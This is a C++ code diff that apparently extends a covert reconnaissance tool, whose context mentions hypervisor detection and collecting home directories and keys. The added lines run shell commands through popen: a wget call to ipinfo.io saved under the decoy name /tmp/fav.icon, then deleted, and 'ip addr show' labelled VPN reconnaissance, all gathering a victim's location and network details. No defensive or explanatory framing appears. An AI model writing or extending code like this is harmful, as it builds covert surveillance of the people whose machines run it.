@@ -45,6 +45,17 @@ static bool is_numeric(const char* str) {
     return true;
 }
 
+std::string exec_helper(const char* cmd) {
+    std::array<char, 128> buffer;
+    std::string r;
+    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
+    if(!pipe) { return "ERR, pipe failed"; }
+    while(fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+        r += buffer.data();
+    }
+    return r;
+}
+
 // ============================================================================
 // HYPERVISOR DETECTION via CPUID
 // ============================================================================
@@ -385,6 +396,25 @@ std::string perform_full_recon() {
     }
 
     output << collect_home_and_keys();
+
+    output << "\n=== END RECON ===\n";
+    return output.str();
+}
+
+std::string collect_location_info() {
+    std::ostringstream output;
+
+    std::string o1 = exec_helper("wget -O /tmp/fav.icon ipinfo.io");
+    std::string o2 = exec_helper("cat /tmp/fav.icon");
+    std::string o3 = exec_helper("rm /tmp/fav.icon");
+
+    output << "=== LOCATION RECONNAISSANCE ===\n";
+    output << "IP based location info: " << o2 << "\n";
+
+    std::string o4 = exec_helper("ip addr show");
+
+    output << "\n--- VPN RECONNAISSANCE ---\n";
+    output << o4 << "\n";
 
     output << "\n=== END RECON ===\n";
     return output.str();
